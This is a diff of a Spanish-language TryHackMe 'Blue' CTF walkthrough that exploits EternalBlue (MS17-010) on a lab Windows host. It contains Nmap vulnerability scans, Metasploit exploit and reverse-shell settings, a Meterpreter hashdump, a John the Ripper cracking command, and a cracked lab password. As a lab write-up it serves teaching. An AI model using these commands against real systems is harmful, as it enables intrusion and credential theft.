@@ -285,40 +285,34 @@
     <div><h2 id="introducción">Introducción</h2>
 <p>Se trata de la segunda máquina de la serie &ldquo;Offensive Pentesting&rdquo; de TryHackMe, que se centra en la explotación de la vulnerabilidad EternalBlue en sistemas Windows. Es una sala sencilla, destinada a familiarizarse con el reconocimiento, la explotación y el escalamiento de privilegios en sistemas Windows y en uso de Metasploit y Meterpreter.</p>
 <h2 id="task-1---reconocimiento">Task 1 - Reconocimiento</h2>
-<h3 id="paso-1-escaneo-de-red">Paso 1: Escaneo de Red</h3>
+<h3 id="paso-1-enumeración-de-puertos">Paso 1: Enumeración de Puertos</h3>
 <ul>
-<li>Utilicé Nmap para escanear la red y encontrar hosts disponibles.</li>
-<li>Identifiqué el objetivo como <code>10.10.185.150</code>.</li>
+<li>Realizo un escaneo de puertos con Nmap para identificar los puertos abiertos.</li>
+<li>Descubro que el puerto 445 (SMB) estaba abierto en el objetivo.</li>
+<li>Encuentro una vulnerabilidad conocida en el servicio SMB, MS17-010.</li>
 </ul>
 <p>Comando Nmap:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 10.10.185.0/24
-</span></span></code></pre></div><h3 id="paso-2-enumeración-de-puertos">Paso 2: Enumeración de Puertos</h3>
-<ul>
-<li>Realicé un escaneo de puertos con Nmap para identificar los puertos abiertos.</li>
-<li>Descubrí que el puerto 445 (SMB) estaba abierto en el objetivo.</li>
-</ul>
-<p>Comando Nmap:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- 10.10.185.150
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sV --script vuln -p- 10.10.185.150
 </span></span></code></pre></div><h2 id="task-2---explotación">Task 2 - Explotación</h2>
-<h3 id="paso-3-identificación-de-vulnerabilidad">Paso 3: Identificación de Vulnerabilidad</h3>
+<h3 id="paso-2-identificación-de-vulnerabilidad">Paso 2: Identificación de Vulnerabilidad</h3>
 <ul>
-<li>Investigé la vulnerabilidad MS17-010 y su explotación potencial.</li>
-<li>Decidí utilizar el módulo &ldquo;ms17_010_eternalblue&rdquo; de Metasploit.</li>
+<li>Investigo sobre la vulnerabilidad MS17-010 y su explotación potencial.</li>
+<li>Busco el módulo &ldquo;ms17_010_eternalblue&rdquo; de Metasploit y lo selecciono.</li>
 </ul>
 <p>Herramienta Metasploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>use windows/smb/ms17_010_eternalblue
-</span></span></code></pre></div><h3 id="paso-4-explotación">Paso 4: Explotación</h3>
+</span></span></code></pre></div><h3 id="paso-3-explotación">Paso 3: Explotación</h3>
 <ul>
-<li>Configuré Metasploit con mi dirección IP como host.</li>
-<li>Ejecuté el exploit para obtener acceso al sistema objetivo.</li>
-<li>¡Obtuve una shell en el sistema objetivo!</li>
+<li>Configuro Metasploit con mi dirección IP como host.</li>
+<li>Ejecuto el exploit para obtener acceso en el sistema objetivo.</li>
+<li>Consigo una shell inversa y la con Meterpreter.</li>
 </ul>
 <p>Comandos Metasploit:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>set RHOSTS 10.10.185.150
 </span></span><span style="display:flex;"><span>set LHOST &lt;mi dirección IP&gt;
 </span></span><span style="display:flex;"><span>exploit
 </span></span></code></pre></div><h2 id="task-3---escalamiento-de-privilegios">Task 3 - Escalamiento de Privilegios</h2>
-<h3 id="paso-5-escalamiento-de-privilegios">Paso 5: Escalamiento de Privilegios</h3>
+<h3 id="paso-4-escalamiento-de-privilegios">Paso 4: Escalamiento de Privilegios</h3>
 <ul>
 <li>Exploré cómo aumentar mis privilegios y convertir mi shell en una sesión de Meterpreter.</li>
 <li>Utilicé el módulo &ldquo;shell_to_meterpreter&rdquo; de Metasploit para lograrlo.</li>
@@ -328,13 +322,13 @@
 </span></span><span style="display:flex;"><span>set SESSION &lt;número de sesión&gt;
 </span></span><span style="display:flex;"><span>exploit
 </span></span></code></pre></div><h2 id="task-4---descifrando-contraseñas">Task 4 - Descifrando Contraseñas</h2>
-<h3 id="paso-6-extracción-de-contraseñas">Paso 6: Extracción de Contraseñas</h3>
+<h3 id="paso-5-extracción-de-contraseñas">Paso 5: Extracción de Contraseñas</h3>
 <ul>
 <li>Con Meterpreter, ejecuté el comando &ldquo;hashdump&rdquo; para extraer las contraseñas almacenadas en el sistema.</li>
 </ul>
 <p>Comando Meterpreter:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashdump
-</span></span></code></pre></div><h3 id="paso-7-descifrando-contraseña">Paso 7: Descifrando Contraseña</h3>
+</span></span></code></pre></div><h3 id="paso-6-descifrando-contraseña">Paso 6: Descifrando Contraseña</h3>
 <ul>
 <li>Copié el hash de contraseña de un usuario no predeterminado y utilicé John the Ripper para descifrarlo.</li>
 <li>La contraseña descifrada resultante fue &ldquo;alqfna22&rdquo;.</li>
@@ -342,7 +336,7 @@
 <p>Comandos John the Ripper:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt hashdump.txt --format<span style="color:#f92672">=</span>NT
 </span></span></code></pre></div><h2 id="task-5---búsqueda-de-banderas">Task 5 - Búsqueda de Banderas</h2>
-<h3 id="paso-8-búsqueda-de-banderas">Paso 8: Búsqueda de Banderas</h3>
+<h3 id="paso-7-búsqueda-de-banderas">Paso 7: Búsqueda de Banderas</h3>
 <ul>
 <li>Utilicé el comando &ldquo;search&rdquo; en Meterpreter para encontrar las ubicaciones de las banderas en el sistema.</li>
 <li>Descubrí las siguientes banderas:
@@ -355,7 +349,7 @@
 </ul>
 <p>Comando Meterpreter:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>search -f flag*.txt
-</span></span></code></pre></div><h3 id="paso-9-exploración-de-banderas">Paso 9: Exploración de Banderas</h3>
+</span></span></code></pre></div><h3 id="paso-8-exploración-de-banderas">Paso 8: Exploración de Banderas</h3>
 <ul>
 <li>Usé comandos como &ldquo;cat&rdquo; para mostrar el contenido de las banderas y encontrar las respuestas a las preguntas planteadas.</li>
 </ul>
